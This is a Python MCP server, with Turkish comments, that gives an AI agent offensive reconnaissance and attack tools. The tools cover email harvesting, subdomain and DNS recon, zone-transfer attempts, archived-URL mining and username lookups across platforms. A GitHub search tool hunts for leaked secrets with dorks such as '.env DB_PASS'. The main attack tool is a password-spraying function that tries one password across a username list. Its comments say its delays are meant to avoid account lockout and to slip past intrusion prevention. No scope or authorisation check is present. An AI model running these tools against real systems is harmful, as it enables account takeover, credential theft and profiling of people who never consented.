#!/usr/bin/env python3
"""
mcp-osint-tools: Gelişmiş OSINT ve Password Spraying Sunucusu
CCO için e-posta toplama ve hesabı kilitlemeden güvenli parola püskürtme işlemleri.
"""

import os
import re
import json
import time
import socket
import requests
import urllib.parse
from mcp.server.fastmcp import FastMCP

# dnspython opsiyonel — yoksa DNS tool'ları net hata döner
try:
    import dns.resolver
    import dns.query
    import dns.zone
    HAS_DNSPYTHON = True
except Exception:
    HAS_DNSPYTHON = False

# SSL uyarılarını bastır (verify=False kullanımında)
try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
)

# Sunucu oluştur
mcp = FastMCP("mcp-osint-tools")

@mcp.tool()
def gather_emails(domain: str, max_pages: int = 2) -> str:
    """Belirtilen domain için arama motorları üzerinden basit e-posta keşfi yapar (Google Dorks / OSINT).
    
    Args:
        domain: Hedef domain (örn: example.com)
        max_pages: Arama yapılacak maksimum sayfa sayısı
    """
    # Not: Gerçek hayatta burada theHarvester, gitrecon, veya Hunter.io API'si entegre edilir.
    # Bu basit bir simülasyon/örnek aracıdır.

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    }
    
    emails = set()
    queries = [
        f'"{domain}" email',
        f'"@"{domain}" contact',
    ]
    
    for query in queries:
        try:
            url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(query)}"
            r = requests.get(url, headers=headers, timeout=15)
            
            # Basit regex ile e-posta arama
            found = re.findall(r'[a-zA-Z0-9.\-_]+@' + re.escape(domain), r.text, re.IGNORECASE)
            for f in found:
                emails.add(f.lower())
                
            time.sleep(2) # Ban yememek için bekleme
        except Exception:
            pass

    summary = {
        "domain": domain,
        "emails_found": list(emails),
        "total": len(emails),
        "note": "Gerçek sonuçlar için 'theHarvester' komutunu kali üzerinden tetikleyebilirsiniz."
    }
    
    return json.dumps(summary, indent=2, ensure_ascii=False)


@mcp.tool()
def password_spray_structured(target_url: str, usernames_file: str, password: str, delay_sec: int = 5, timeout_sec: int = 15) -> str:
    """Belirtilen bir URL'ye (Basic Auth, OWA veya basit POST login) yavaşça şifre dener.
    Account Lockout olmasını engellemek için her deneme arasına gecikme (delay) ekler.
    
    Args:
        target_url: Hedef Login URL'i
        usernames_file: Kullanıcı adlarının bulunduğu dosya yolu (Her satırda bir kullanıcı)
        password: Denenecek TEK şifre
        delay_sec: Her istek arası beklenecek saniye (Varsayılan: 5s)
        timeout_sec: Her istek için HTTP timeout süresi
    """
    if not os.path.exists(usernames_file):
        return json.dumps({"error": f"Dosya bulunamadı: {usernames_file}"})
        
    try:
        with open(usernames_file, "r") as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        return json.dumps({"error": f"Dosya okuma hatası: {e}"})

    if not users:
        return json.dumps({"error": "Kullanıcı listesi boş."})

    results = []
    successes = []
    
    # Çok fazla kullanıcı varsa (örn: 1000+), proxy veya daha iyi bir strateji gerekebilir.
    # Şimdilik en fazla ilk 100 kullanıcıyı deniyoruz.
    users = users[:100]

    for i, user in enumerate(users):
        try:
            # Örnek olarak HTTP Basic Auth denemesi
            # Gerçek senaryoda POST datası da dinamik olarak tool'a eklenebilir.
            r = requests.get(target_url, auth=(user, password), timeout=timeout_sec, verify=False)
            
            if r.status_code not in [401, 403, 429]:
                # Eğer 401 Unauthorized dönmediyse, büyük ihtimalle şifre doğru veya login portal değil
                successes.append({"username": user, "password": password, "status": r.status_code})
            
            if r.status_code == 429:
                results.append({"error": "Rate Limit / 429 Too Many Requests alındı. Tarama durduruluyor."})
                break
                
        except Exception as e:
            results.append({"username": user, "error": str(e)})
            
        # İstekler arasına lockout ve IPS engelini aşmak için bekleme ekle
        if i < len(users) - 1:
            time.sleep(delay_sec)
            
    summary = {
        "target": target_url,
        "users_tested": len(users),
        "password_tried": password,
        "successful_logins": successes,
        "errors": len(results)
    }
    
    return json.dumps(summary, indent=2, ensure_ascii=False)


@mcp.tool()
def crtsh_subdomains(domain: str, include_expired: bool = True) -> str:
    """Certificate Transparency loglarından (crt.sh) PASIF subdomain keşfi yapar.

    Hedefle doğrudan temas kurmadan, SSL sertifikalarından subdomain çıkarır.
    Scope dışı hedeflerde bile güvenle çalışır (allowlist: crt.sh).

    Args:
        domain: Kök domain (örn: example.com)
        include_expired: Süresi dolmuş sertifikaları da dahil et
    """
    try:
        url = f"https://crt.sh/?q=%25.{urllib.parse.quote(domain)}&output=json"
        if not include_expired:
            url += "&exclude=expired"
        r = requests.get(url, headers={"User-Agent": UA}, timeout=30)
        if r.status_code != 200 or not r.text.strip():
            return json.dumps({"error": f"crt.sh yanıt vermedi (HTTP {r.status_code})", "domain": domain})
        try:
            data = r.json()
        except Exception:
            # crt.sh bazen satır satır JSON döner
            data = [json.loads(line) for line in r.text.strip().splitlines() if line.strip()]

        subs = set()
        for entry in data:
            for field in ("name_value", "common_name"):
                val = entry.get(field, "")
                for name in str(val).splitlines():
                    name = name.strip().lower().lstrip("*.")
                    if name.endswith(domain) and name:
                        subs.add(name)

        result = {
            "domain": domain,
            "source": "crt.sh (Certificate Transparency)",
            "subdomains": sorted(subs),
            "total": len(subs),
        }
        return json.dumps(result, indent=2, ensure_ascii=False)
    except Exception as e:
        return json.dumps({"error": f"crt.sh sorgusu başarısız: {e}", "domain": domain})


@mcp.tool()
def dns_recon(domain: str, resolver_ip: str = "8.8.8.8") -> str:
    """Bir domain için kapsamlı DNS kaydı keşfi (A, AAAA, MX, NS, TXT, CNAME, SOA).

    Pasif keşfin temel adımı — mail sunucuları, name server'lar, SPF/DMARC
    kayıtları ve IP adreslerini tek seferde toplar.

    Args:
        domain: Hedef domain
        resolver_ip: Kullanılacak DNS resolver (varsayılan: Google 8.8.8.8)
    """
    if not HAS_DNSPYTHON:
        return json.dumps({"error": "dnspython kurulu değil: pip install dnspython"})

    resolver = dns.resolver.Resolver()
    resolver.nameservers = [resolver_ip]
    resolver.timeout = 5
    resolver.lifetime = 8

    records = {}
    for rtype in ("A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"):
        try:
            answers = resolver.resolve(domain, rtype)
            records[rtype] = [r.to_text().strip('"') for r in answers]
        except dns.resolver.NoAnswer:
            records[rtype] = []
        except dns.resolver.NXDOMAIN:
            return json.dumps({"error": f"NXDOMAIN — {domain} mevcut değil", "domain": domain})
        except Exception as e:
            records[rtype] = [f"hata: {e}"]

    # SPF / DMARC tespiti
    notes = []
    for txt in records.get("TXT", []):
        if "v=spf1" in txt.lower():
            notes.append("SPF kaydı mevcut")
        if "v=dmarc1" in txt.lower():
            notes.append("DMARC kaydı mevcut")

    return json.dumps(
        {"domain": domain, "resolver": resolver_ip, "records": records, "notes": notes},
        indent=2, ensure_ascii=False,
    )


@mcp.tool()
def dns_zone_transfer(domain: str) -> str:
    """DNS Zone Transfer (AXFR) zafiyeti dener — tüm name server'lara karşı.

    Yanlış yapılandırılmış DNS sunucuları tüm zone'u ifşa edebilir (kritik bulgu).
    Genelde kapalıdır ama her zaman denemek gerekir.

    Args:
        domain: Hedef domain
    """
    if not HAS_DNSPYTHON:
        return json.dumps({"error": "dnspython kurulu değil: pip install dnspython"})

    try:
        ns_records = [str(ns).rstrip(".") for ns in dns.resolver.resolve(domain, "NS")]
    except Exception as e:
        return json.dumps({"error": f"NS kayıtları alınamadı: {e}", "domain": domain})

    results = {}
    vulnerable = []
    for ns in ns_records:
        try:
            ns_ip = socket.gethostbyname(ns)
            zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=8))
            names = [f"{n}.{domain}" for n in zone.nodes.keys()]
            results[ns] = {"status": "VULNERABLE — AXFR açık!", "records": names[:200], "count": len(names)}
            vulnerable.append(ns)
        except Exception as e:
            results[ns] = {"status": "kapalı/güvenli", "detail": str(e)[:120]}

    return json.dumps(
        {
            "domain": domain,
            "nameservers": ns_records,
            "vulnerable_nameservers": vulnerable,
            "severity": "critical" if vulnerable else "info",
            "results": results,
        },
        indent=2, ensure_ascii=False,
    )


@mcp.tool()
def wayback_urls(domain: str, limit: int = 500, only_params: bool = False) -> str:
    """Wayback Machine (web.archive.org) arşivinden geçmiş URL'leri çeker.

    Eski/unutulmuş endpoint'ler, parametreli URL'ler ve gizli yollar için
    altın madeni. Hedefle temas kurmaz (allowlist: archive.org).

    Args:
        domain: Hedef domain
        limit: Maksimum URL sayısı
        only_params: True → sadece query parametresi içeren URL'leri döndür (saldırı yüzeyi)
    """
    try:
        url = (
            f"http://web.archive.org/cdx/search/cdx?url={urllib.parse.quote(domain)}/*"
            f"&output=json&collapse=urlkey&fl=original&limit={limit}"
        )
        r = requests.get(url, headers={"User-Agent": UA}, timeout=30)
        if r.status_code != 200:
            return json.dumps({"error": f"Wayback yanıt vermedi (HTTP {r.status_code})"})
        rows = r.json()
        urls = [row[0] for row in rows[1:]] if rows else []
        if only_params:
            urls = [u for u in urls if "?" in u and "=" in u]
        return json.dumps(
            {"domain": domain, "source": "web.archive.org", "urls": urls, "total": len(urls)},
            indent=2, ensure_ascii=False,
        )
    except Exception as e:
        return json.dumps({"error": f"Wayback sorgusu başarısız: {e}", "domain": domain})


@mcp.tool()
def rdap_whois(domain: str) -> str:
    """RDAP (modern WHOIS) ile domain kayıt bilgisi çeker — API key gerekmez.

    Kayıt tarihi, registrar, name server'lar, status flag'leri ve iletişim
    bilgilerini yapısal JSON olarak döndürür (rdap.org).

    Args:
        domain: Hedef domain
    """
    try:
        r = requests.get(
            f"https://rdap.org/domain/{urllib.parse.quote(domain)}",
            headers={"User-Agent": UA, "Accept": "application/rdap+json"},
            timeout=20,
        )
        if r.status_code == 404:
            return json.dumps({"error": "Domain RDAP'te bulunamadı", "domain": domain})
        if r.status_code != 200:
            return json.dumps({"error": f"RDAP HTTP {r.status_code}", "domain": domain})
        data = r.json()

        events = {e.get("eventAction"): e.get("eventDate") for e in data.get("events", [])}
        nameservers = [ns.get("ldhName") for ns in data.get("nameservers", [])]
        registrar = None
        for ent in data.get("entities", []):
            if "registrar" in ent.get("roles", []):
                for v in ent.get("vcardArray", [[], []])[1]:
                    if v[0] == "fn":
                        registrar = v[3]

        summary = {
            "domain": domain,
            "handle": data.get("handle"),
            "status": data.get("status", []),
            "registrar": registrar,
            "registration_date": events.get("registration"),
            "expiration_date": events.get("expiration"),
            "last_changed": events.get("last changed"),
            "nameservers": nameservers,
        }
        return json.dumps(summary, indent=2, ensure_ascii=False)
    except Exception as e:
        return json.dumps({"error": f"RDAP sorgusu başarısız: {e}", "domain": domain})


@mcp.tool()
def username_osint(username: str, timeout_sec: int = 8) -> str:
    """Bir kullanıcı adının popüler platformlardaki varlığını kontrol eder (sherlock tarzı).

    Sosyal medya hesap keşfi — bug bounty recon ve OSINT için. Hedef kişi/kurum
    parmak izini çıkarmaya yarar.

    Args:
        username: Aranacak kullanıcı adı
        timeout_sec: Her platform için HTTP timeout
    """
    platforms = {
        "GitHub": "https://github.com/{}",
        "GitLab": "https://gitlab.com/{}",
        "Twitter/X": "https://x.com/{}",
        "Instagram": "https://www.instagram.com/{}/",
        "Reddit": "https://www.reddit.com/user/{}",
        "Medium": "https://medium.com/@{}",
        "Keybase": "https://keybase.io/{}",
        "TryHackMe": "https://tryhackme.com/p/{}",
        "HackTheBox": "https://app.hackthebox.com/users/{}",
        "Telegram": "https://t.me/{}",
        "Pastebin": "https://pastebin.com/u/{}",
        "HackerOne": "https://hackerone.com/{}",
        "Bugcrowd": "https://bugcrowd.com/{}",
        "Dev.to": "https://dev.to/{}",
    }
    found, not_found, errors = [], [], []
    headers = {"User-Agent": UA}
    for site, tmpl in platforms.items():
        url = tmpl.format(urllib.parse.quote(username))
        try:
            r = requests.get(url, headers=headers, timeout=timeout_sec, allow_redirects=True)
            if r.status_code == 200:
                found.append({"platform": site, "url": url})
            elif r.status_code in (404, 410):
                not_found.append(site)
            else:
                errors.append({"platform": site, "status": r.status_code})
        except Exception:
            errors.append({"platform": site, "error": "timeout/connection"})
        time.sleep(0.3)

    return json.dumps(
        {
            "username": username,
            "found": found,
            "found_count": len(found),
            "not_found": not_found,
            "inconclusive": errors,
            "note": "200 != kesin var; bazı siteler her username için 200 döner. Manuel doğrula.",
        },
        indent=2, ensure_ascii=False,
    )


@mcp.tool()
def github_code_search(query: str, max_results: int = 20, github_token: str = "") -> str:
    """GitHub'da kod/repo araması yapar — sızdırılmış secret, config, endpoint avı.

    `GITHUB_TOKEN` env (veya parametre) verilirse gerçek KOD araması yapar
    (api.github.com/search/code). Token yoksa REPO araması yapar (auth'suz, limitli).

    Örnek query: 'example.com password', 'org:acme api_key', 'filename:.env DB_PASS'

    Args:
        query: GitHub arama sorgusu (dork)
        max_results: Maksimum sonuç
        github_token: Opsiyonel PAT (yoksa GITHUB_TOKEN env okunur)
    """
    token = github_token or os.environ.get("GITHUB_TOKEN", "")
    headers = {"User-Agent": UA, "Accept": "application/vnd.github+json"}

    if token:
        headers["Authorization"] = f"Bearer {token}"
        endpoint = "https://api.github.com/search/code"
        mode = "code"
    else:
        endpoint = "https://api.github.com/search/repositories"
        mode = "repository (auth'suz — kod araması için GITHUB_TOKEN ver)"

    try:
        r = requests.get(
            endpoint,
            headers=headers,
            params={"q": query, "per_page": min(max_results, 50)},
            timeout=20,
        )
        if r.status_code == 403:
            return json.dumps({"error": "GitHub rate limit/403. GITHUB_TOKEN ile dene.", "mode": mode})
        if r.status_code == 422:
            return json.dumps({"error": "Geçersiz sorgu (422). Kod araması GITHUB_TOKEN gerektirir.", "mode": mode})
        if r.status_code != 200:
            return json.dumps({"error": f"GitHub HTTP {r.status_code}", "mode": mode})
        data = r.json()

        items = []
        for it in data.get("items", [])[:max_results]:
            if mode == "code":
                items.append({
                    "repo": it.get("repository", {}).get("full_name"),
                    "path": it.get("path"),
                    "url": it.get("html_url"),
                })
            else:
                items.append({
                    "repo": it.get("full_name"),
                    "description": it.get("description"),
                    "stars": it.get("stargazers_count"),
                    "url": it.get("html_url"),
                })
        return json.dumps(
            {"query": query, "mode": mode, "total_count": data.get("total_count", 0), "results": items},
            indent=2, ensure_ascii=False,
        )
    except Exception as e:
        return json.dumps({"error": f"GitHub araması başarısız: {e}", "mode": mode})


if __name__ == "__main__":
    mcp.run()
